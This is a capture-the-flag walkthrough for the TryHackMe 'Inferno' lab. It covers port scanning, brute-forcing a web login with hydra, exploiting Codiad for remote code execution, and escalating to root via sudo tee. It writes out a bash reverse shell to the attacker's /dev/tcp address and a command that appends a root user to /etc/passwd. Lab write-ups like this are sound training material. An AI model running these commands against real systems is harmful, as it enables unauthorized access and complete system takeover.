# Inferno | THM
### Difficulty level: Medium
---------------------------------------
First let’s start with the enumeration part:

```bash
nmap <target-ip>
```
Results:

PORT STATE SERVICE:
21/tcp open ftp
22/tcp open ssh
23/tcp open telnet
25/tcp open smtp
80/tcp open http
88/tcp open kerberos-sec
106/tcp open pop3pw
110/tcp open pop3
389/tcp open ldap
443/tcp open https
464/tcp open kpasswd5
636/tcp open ldapssl
777/tcp open multiling-http
783/tcp open spamassassin
808/tcp open ccproxy-http
873/tcp open rsync
1001/tcp open webpush
1236/tcp open bvcontrol
1300/tcp open h323hostcallsc
2000/tcp open cisco-sccp
2003/tcp open finger
2121/tcp open ccproxy-ftp
2601/tcp open zebra
2602/tcp open ripd
2604/tcp open ospfd
2605/tcp open bgpd
2607/tcp open connection
2608/tcp open wag-service
4224/tcp open xtell
5051/tcp open ida-agent
5432/tcp open postgresql
5555/tcp open freeciv
5666/tcp open nrpe
6346/tcp open gnutella
6566/tcp open sane-port
6667/tcp open irc
8021/tcp open ftp-proxy
8088/tcp open radan-http

So, the amount of the ports is huge, we are going to use those services:
SSH & HTTP.
Its time to Gobuster. Let’s find some hidden directories:
```bash
gobuster dir -u <target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
Results:

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*dAQ8hK36p3gUupjT9w6s5g.png)

Inferno dir can be interesting. Let’s move on.
Checking the web app and we got a piece of text and a picture.

![image](https://github.com/alonpresman/AlonPresman/assets/121765218/e4e76337-c19e-4db1-821a-8637b5937582)

After a little research I found that picture and the text relate to Dante Alighieri. ( for more info: https://en.wikipedia.org/wiki/Dante_Alighieri )
Now, let’s check /inferno.

![image](https://miro.medium.com/v2/resize:fit:750/format:webp/1*GrrnpGTHrstpFdN0yi9l5g.png)

There is a login popup alert, but what should I do with that?
Maybe the translation of the text can give us a clue:
![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*rFenEQbRChJh6I7vEnF1BQ.png)

“The other were two, which are added to this one over the middle of each shoulder …” wait what?! it can be hydra or kerberos hint.
![image](https://miro.medium.com/v2/resize:fit:576/format:webp/1*vjAXNABa88lEOUXLslKctw.png)

Maybe attack that login page with hydra! First let’s give it a try with “admin” as username.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*hGog1odgFV3FMZD79Zqp_g.png)

and this attempt worked!!!
after login with those credentials, I got another login page.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*tzr3GcP-Vrk2t-MFHXQq6w.png)

Let’s try those credentials in the next login page.
I’m in.
Reading README.md file:

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*SbQHX2SnXZ4naShOFKmYiA.png)

As we can see this is Codiad web-based IDE.
Searchsploit time!

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*EvzLflgHb13LdnOsh7LtbQ.png)

getting that code from exploit-db:

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*WK_AE4x9RRLWFH8BvWJcdA.png)

first I'll give it execute permissions.

```bash
chmod 777 49705.py
```

Next, I found github page that explain how to use this payload.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*yvfhK6UItzUH0zQ8cIM2rQ.png)

https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit

Thanks, wangYihang :)

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*36gB3tglieMBct7R1-6k0w.png)

So, we need to execute 2 commands to make it.
first, we are going to open netcat listener on port 4445
and inside we are going to create a reverse shell with that command (in a new terminal):

```bash
echo 'bash -c "bash -i >/dev/tcp/<ip-address>/4446 0>&1 2>&1"' | nc -lnvp 4445
```
and open a listener for port 4446. (new terminal).

```bash
nc -lnvp 4446
```
![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*HRnsu6lR-phx2oJIUoEnCg.png)

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*q-F_nr5Sb4UeJhtyQljFtw.png)

after exploring the system, I found something interesting…

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*jCEGSamH67I2MhETSIBVEQ.png)

I’ll take that hexes and convert it to text!

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*vnbVB2zmlnty2nKIBt345Q.png)

SSH connection time!
after getting into the user with ssh service let’s run sudo -l to check which path or file we can exploit to get root!

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*78tjXuIBmBr4QZKq-vJzYQ.png)

So “tee”! let’s find some vulnerability that relates it.

I found a site with tee privilege escalation technique. I’m going to try it.

https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-tee-privilege-escalation/

Step1: Create a New Password for New User:

```bash
openssl passwd -1 -salt "alon" "123"
```
![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*Cu4GjxCnvTgOJFfhKVLzNw.png)

Step 2: Write new line with “tee”.

```bash
printf 'alon:$1$alon$htpZ12KxJxTviYnmZLRxQ0:0:0:root:/root:/bin/bash\n' | sudo tee -a /etc/passwd
```

3. Switch to a new user and find proof.txt

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*XQgsV0tpzfsUbdsoCWoORA.png)

and I’ve rooted INFERNO!

Happy Hacking!

**Written by Alon Presman, Penetration Tester and Ethical Hacker.**






















